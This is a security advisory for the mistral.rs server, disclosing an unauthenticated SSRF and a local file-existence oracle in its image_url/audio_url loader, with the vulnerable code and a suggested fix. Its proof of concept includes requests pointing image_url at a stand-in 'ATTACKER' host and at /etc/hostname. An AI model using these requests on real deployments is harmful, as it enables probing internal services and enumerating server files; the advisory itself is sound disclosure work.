# [H] mistral.rs Media Loader: Unauthenticated SSRF and arbitrary local file read via image_url

## Summary
Severity: High
Advisory: GHSA-wfgq-w7cq-qj7j
Ecosystem: crates.io
Published: 2026-09-10
Source: https://osv.dev/vulnerability/GHSA-wfgq-w7cq-qj7j
Type: osv

## Affected
- crates.io: `mistralrs-server-core` — affected >=0 <0.8.18

## Details
### Summary
mistral.rs fetches any request-supplied image/audio URL with no host or IP validation, and opens arbitrary local files (a `file://` URL, or any existing relative/absolute path). A remote, unauthenticated client of any vision/audio deployment can cause the server to issue requests to internal or cloud-metadata addresses (SSRF) and to open arbitrary local files, via the standard OpenAI `image_url` / `audio_url` message content. The server is unauthenticated by default.

### Details
`parse_image_url` in `mistralrs-server-core/src/util.rs` (lines 45-88) resolves the request string and fetches/opens it:

```rust
let url = if let Ok(url) = url::Url::parse(url_unparsed) {
    url
} else if File::open(url_unparsed).await.is_ok() {            // a bare existing path (relative or absolute)
    url::Url::from_file_path(std::path::absolute(url_unparsed)?) ...
} else { bail!(...) };

let bytes = if url.scheme() == "http" || url.scheme() == "https" {
    reqwest::get(url.clone()).await ...                       // SSRF: no host/IP/allowlist check
} else if url.scheme() == "file" {
    File::open(path).await ... read                           // arbitrary local file read
} else if url.scheme() == "data" { ... base64 ... };
```

`reqwest::get` has no allowlist, no private/loopback/link-local/metadata block, and follows redirects by default. The `file` scheme (and any bare path that already exists on the server, resolved at line 48) is opened and read. `parse_audio_url` (line 91) is identical for `audio_url`.

The value reaches this unvalidated: `mistralrs-server-core/src/chat_completion.rs` calls `parse_image_url(&url_unparsed)` / `parse_audio_url(&url_unparsed)` on the chat message content, at request time.

For reference, vLLM gates outbound media domains (`allowed_media_domains`) and local paths (`allowed_local_media_path`); mistral.rs has neither.

### Suggested fix
Restrict request-supplied media to `http(s)` and `data:`; do not resolve bare strings to local files and do not honor the `file` scheme from request input (gate any local-media behind an explicit, default-disabled option). Before fetching `http(s)`, resolve the host and reject non-global IPs (private / loopback / link-local / metadata), pin the connection to the validated IP, and re-validate redirects (or disable them). Cap the read size.

### Proof of concept
On a default vision deployment, unauthenticated:

SSRF - the server fetches the attacker URL during request processing:

```
POST /v1/chat/completions
{"model":"<vlm>","messages":[{"role":"user","content":[
  {"type":"image_url","image_url":{"url":"http://ATTACKER/probe"}},
  {"type":"text","text":"hi"}]}],"max_tokens":1}
```

An out-of-band HTTP GET arrives at ATTACKER; a redirect to an internal/metadata address is followed.

Arbitrary local file open, with a file-existence oracle in the response body (an existing file and a nonexistent path return different errors):

existing file (opened and read, then fails to decode):

```
POST /v1/chat/completions
{"model":"<vlm>","messages":[{"role":"user","content":[
  {"type":"image_url","image_url":{"url":"/etc/hostname"}},
  {"type":"text","text":"hi"}]}],"max_tokens":1}

-> 500, response body message: "The image format could not be determined"
```

nonexistent path:

```
POST /v1/chat/completions
{"model":"<vlm>","messages":[{"role":"user","content":[
  {"type":"image_url","image_url":{"url":"/nonexistent"}},
  {"type":"text","text":"hi"}]}],"max_tokens":1}

-> 500, response body message: "Invalid source '/nonexistent': not a valid URL (http/https/data) and file not found on server. ..."
```

The difference is structural: `parse_image_url` (util.rs:48) takes the file branch only when `File::open(url_unparsed)` succeeds, otherwise it bails with "file not found on server" (util.rs:52); an existing-but-non-image file is read and then fails in `image::load_from_memory` (util.rs:87). The error response carries `sanitize_error_message` (util.rs:210), which returns the root-cause message, so both reach the client verbatim.

### Impact
An attacker with network access to a default vision/audio deployment can reach internal services and the cloud metadata endpoint (SSRF, confirmed end to end). The fetched bytes go to a media decoder, not back to the attacker, so the SSRF is blind: egress to attacker-chosen internal hosts is the usable primitive. The loader also opens a request-supplied `file://` URL or any existing local path, and the response distinguishes an existing file from a nonexistent path (and an existing non-image file from a directory), giving an unauthenticated file-existence and file-type oracle over the server filesystem. The file contents are not returned, so this is an existence/enumeration oracle, not content disclosure.

Availability (CVSS A:L): `reqwest::get` (util.rs:61) uses the default client, which has no timeout, and `http_resp.bytes()` (util.rs:62) reads the entire response body with no size cap, so an attacker-chosen unbounded or non-responding host exhausts or ties up a worker. The `file` branch allocates `vec![0; metadata.len()]` (util.rs:73) before reading, so pointing at a large local file does the same.

## References
- https://github.com/EricLBuehler/mistral.rs/security/advisories/GHSA-wfgq-w7cq-qj7j
- https://github.com/EricLBuehler/mistral.rs/commit/74793379649febc758b6a0d4b71aa6aeabc80f9c
- https://github.com/EricLBuehler/mistral.rs
